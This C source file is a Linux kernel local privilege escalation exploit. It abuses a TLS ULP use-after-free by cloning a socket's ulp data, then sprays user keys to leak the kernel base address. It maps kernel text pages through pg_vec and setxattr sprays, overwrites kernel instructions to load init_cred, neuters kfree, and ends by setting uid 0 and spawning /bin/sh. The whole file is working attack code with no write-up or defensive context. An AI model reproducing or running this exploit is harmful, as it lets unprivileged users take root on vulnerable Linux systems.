
#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sched.h>
#include <fcntl.h>
#include <string.h>
#include <byteswap.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/sem.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <linux/tls.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/tcp.h>
#include <netinet/in.h>

#include "netlink_utils.h"

#define ADD_LINK  RTM_NEWLINK
#define DEL_LINK  RTM_DELLINK
#define FLUSH     RTM_GETLINK
#define ADD_ADDR  RTM_NEWADDR
#define DEL_ADDR  RTM_DELADDR
#define ADD_QDISC RTM_NEWQDISC
#define DEL_QDISC RTM_DELQDISC
#define ADD_CLASS RTM_NEWTCLASS
#define DEL_CLASS RTM_DELTCLASS

#define N_NET_INTERFACES 0x1800

int tls1, tls2, tls3, tls4;

int net_if(int action, char *type, int n, int opt, bool change);

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}
//CPU绑核
void bindCore(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}

int setup_sandbox(void)
{
	if (unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET) < 0) {
		perror("unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET)");
		return -1;
	}
	net_if(ADD_LINK, "lo", -1, IFF_UP, true);

    char edit[0x200];
    int tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
	return 0;
}


int net_if(int action, char *type, int n, int opt, bool change) {

	struct nlmsghdr *msg;
	struct nlattr *opts;
	struct ifinfomsg ifinfo = {};
	struct ifaddrmsg ifaddr = {};
	char name[0x100] = { 0 };
	int sk;

	strcpy(name, type);

	if (n >= 0)
		snprintf(name, sizeof(name), "%s-%d", type, n);

	// Initalize a netlink socket and allocate a nlmsghdr
	sk = nl_init_request(action, &msg, NLM_F_REQUEST|NLM_F_CREATE);
	if (!sk) {
		perror("nl_init_request()");
		return -1;
	}

	switch (action) {
		case ADD_LINK:
		case DEL_LINK:

			ifinfo.ifi_family = AF_UNSPEC;
			ifinfo.ifi_type = PF_NETROM;
			ifinfo.ifi_index = (action == DEL_LINK) ? if_nametoindex(name) : 0;
			ifinfo.ifi_flags = opt;
			ifinfo.ifi_change = change ? 1 : 0;

			nlmsg_append(msg, &ifinfo, sizeof(ifinfo), NLMSG_ALIGNTO);

			if (action == ADD_LINK) {
				// Setting the MTU below IPV6_MIN_MTU, ipv6 is disabled
				// (https://elixir.bootlin.com/linux/v6.1/source/net/ipv6/addrconf.c#L3537)
				// This way we can get rid of an annoying timer that periodically calls qdisc->enqueue()
				nla_put_u32(msg, IFLA_MTU, 1000);
				nla_put_string(msg, IFLA_IFNAME, name);
				opts = nla_nest_start(msg, IFLA_LINKINFO);
				nla_put_string(msg, IFLA_INFO_KIND, type);
				nla_nest_end(msg, opts);
			}

			break;

		case ADD_ADDR:
		case DEL_ADDR:

			ifaddr.ifa_family = AF_INET;
			ifaddr.ifa_prefixlen = 16;
			ifaddr.ifa_flags = 0;
			ifaddr.ifa_scope = RT_SCOPE_UNIVERSE;
			ifaddr.ifa_index = if_nametoindex(name);

			nlmsg_append(msg, &ifaddr, sizeof(ifaddr), NLMSG_ALIGNTO);
			nla_put_u32(msg, IFA_LOCAL, __bswap_32(opt + n));
			nla_put_u32(msg, IFA_ADDRESS, __bswap_32(opt + n));

			break;
	}
	// Send the netlink message and deallocate resources
	return nl_complete_request(sk, msg);
}

int tls1, tls2;
int set_ulp(int port){
    struct sockaddr_in addr;
	socklen_t len = sizeof(addr);
	int tls, s, s2;

	tls = socket(AF_INET, SOCK_STREAM, 0);
	s = socket(AF_INET, SOCK_STREAM, 0);

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(port);

	// Put the socket into ESTABLISHED state
	if(bind(s, &addr, sizeof(addr)) < 0){
        perror("bind");
        exit(-1);
    }

	if(listen(s, 0) < 0){
        perror("listen");
        exit(-1);
    }

	if(connect(tls, &addr, sizeof(addr)) < 0){
        perror("connect");
        exit(-1);
    }

    // Initialize TLS ULP
	if(setsockopt(tls, SOL_TCP, TCP_ULP, "tls", sizeof("tls")) < 0){
        perror("set ulp");
    }

    return tls;
}

int clone_tls(int tls, int port){
    struct sockaddr_in addr;
	socklen_t len = sizeof(addr);
	int s, new;

	s = socket(AF_INET, SOCK_STREAM, 0);


	// Disconnect the input socket `sk`
	addr.sin_family = AF_UNSPEC;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(port);

    connect(tls, &addr, sizeof(addr)); //为什么要先连接一下才能bind？

	// Listen on `sk` (This should not happen!)
	addr.sin_family = AF_INET;
	if(bind(tls, &addr, sizeof(addr)) < 0){
        perror("bind2");
        exit(-1);
    }
	if(listen(tls, 0) < 0){
        perror("listen2");
        exit(-1);
    }
	if(connect(s, &addr, sizeof(addr)) < 0 ){
        perror("connect2");
        exit(-1);
    }

	// Clone icsk_ulp_data
	new = accept(tls, &addr, &len);

	// Now the input socket `sk` and `new`
	// share the same icsk_ulp_data pointer
	return new;
}

#include "key.h"
#define TOTAL_KEYS 60
int kids[TOTAL_KEYS];
void spray_key(int times, int len){
    char des[0x100];
    memset(des, 0, sizeof(des));
    char pay[0x200];
    memset(pay, 0, sizeof(pay));
    for(int i = 0; i < TOTAL_KEYS && i < times; i++){
        memset(des, 'A'+i, 0x80);
        memset(pay, 'a'+i, len);
        kids[i] = key_alloc(des, pay, len);
        printf("kid_%d == %d\n", i, kids[i]);
    }
}

#include <sys/types.h>
#include <sys/xattr.h>

void spray_attr(int times, int size){
    const char *path = "/path/to/file";
    const char *name = "user.attribute";
    const char *value = "value";
    int flags = 0; // 可以是 XATTR_CREATE 或 XATTR_REPLACE

    for(int i = 0; i < times; i++){
        setxattr(path, name, value, size, flags);
    }
}

size_t data[0x20000];
int pipe_kernel[2];

#include "pg_vec.h"
void child(){
    size_t kernel_offset_base;
    unshare_setup();
    puts("here child");
    char cmd[4];
    read(pipe_kernel[0], &kernel_offset_base, 8);
    puts("end2");
    
}
int get_one_key(char des_chr, char pay_chr, int len){
    char des[0x100];
    memset(des, 0, sizeof(des));
    memset(des, des_chr, 0x80);
    char pay[0x400];
    memset(pay, 0, sizeof(pay));
    memset(pay, pay_chr, len);
    return key_alloc(des, pay, len);
}
size_t data2[0x10000];
#define print_init_cred() \
    printf("%p\n", init_cred); \
    puts("hello")

#define mov_rdi_init_cred(con) \
    memcpy(con, "\x48\xbf", 2);\
    memcpy(con+2, &init_cred)

size_t ker_base[0x20000];
#define rcu_time 8

int main(void)
{   
    size_t kernel_offset_base;
    bindCore(0);
	save_status();
    unshare_setup();
    net_if(ADD_LINK, "lo", -1, IFF_UP, true);

    tls1 = set_ulp(1111);
    tls2 = clone_tls(tls1, 1112);
    printf("tls1 == %d, tls2 == %d\n", tls1, tls2);

    tls3 = set_ulp(1113);
    tls4 = clone_tls(tls3, 1114);
    printf("tls3 == %d, tls4 == %d\n", tls3, tls4);

    close(tls1);
    puts("sleeping ... ");
    sleep(1);
    close(tls2);
    puts("sleeping ... ");
    sleep(rcu_time / 2);
    spray_key(1, 0x100);
    size_t data[0x1000];

    
    int key_len = key_read(kids[0], ker_base, 0x20000);
    ker_base[0] -= 0xffffffff820464c0;
    printf("ker_base == %p\n", (void *)ker_base[0]);
    getchar();

    int pfd;
    /*for(int i = 0; i < 0; i++){
        pfd = pagealloc_pad(33, 0x1000); //主要就是这个地方会崩溃；
        printf("pfd == %d\n", pfd);
    }

    key_len = key_read(kids[0], data, 0x20000);
    printf("key_len == %d\n", key_len);
    for(int i = 0; i < 0x100; i++){
        if(data[i] >= 0xffff888000000000 && data[i] <= 0xfffffff000000000){
            printf("data -> %p\n", (void *)data[i]);
            kernel_offset_base = data[i] & 0xfffffff000000000;
            break;
        }
        
    }*/
    
    
    close(tls3);
    puts("sleeping ... ");
    sleep(1);
    close(tls4);
    puts("sleeping ... ");
    sleep(4);

    pfd = pagealloc_pad(33, 0x1000);
    printf("pfd == %d\n", pfd);

    for(int i = 0; i < 33; i++) data2[i] = ker_base[0] + 0xffffffff811d4000 + 0x1000 * i;
    data2[0] = kernel_offset_base;
    
    const char *path = "/test";
    const char *name = "user.attribute";
    const char *value = data2;
    size_t size = 0x200;
    int flags = 0; // 可以是 XATTR_CREATE 或 XATTR_REPLACE


    int result ;
    size_t *page = 0LL;
    size_t init_cred = ker_base[0] + 0xffffffff8244c6c0;

//================================================== patch kernel ============================================================
    data2[0] = ker_base[0] + 0xffffffff8107a000;
    result = setxattr(path, name, value, size, flags);
    if (result == -1) {
        perror("setxattr");
        //return 1;
    }
    page = mmap(NULL, 0x1000*33, PROT_READ|PROT_WRITE, MAP_SHARED, pfd, 0); //mmap的size要和addr对齐
	if (page == MAP_FAILED) {
        perror("mmap");
        //exit(-1);
    }
    char *p = (char *)page;
    printf("page == %p\n", (void *)page);
    memset(p+0xace, 0x90, 6);
    memset(p+0xad7, 0x90, 2);
    memset(p+0xade, 0x90, 6);
    memset(p+0xae8, 0x90, 2);
    memset(p+0xaee, 0x90, 6);

    memset(p+0xbbb, 0x90, 2);
    memcpy(p+0xbbd, "\x48\xbf", 2);
    memcpy(p+0xbbd+2, &init_cred, 8);


    printf("page0 == %p\n", page[0]);
    


//=============================================== patch kfree ===========================================================
    data2[0] = ker_base[0] + 0xffffffff811d4000;
    result = setxattr(path, name, value, size, flags);
    if (result == -1) {
        perror("setxattr");
        //return 1;
    }
    page = mmap(NULL, 0x1000*33, PROT_READ|PROT_WRITE, MAP_SHARED, pfd, 0); //mmap的size要和addr对齐
	if (page == MAP_FAILED) {
        perror("mmap");
        //exit(-1);
    }
    p = page;
    memset(p+0x200, 0xc3, 2);
//===========================================================================================================================

    int end_pfd = pagealloc_pad(33, 0x1000);
    printf("end_pfd == %d\n", end_pfd);
    
    setresuid(0, 0, 0);
    system("/bin/sh");
    
    while(1){
        ;
    }

    
    
}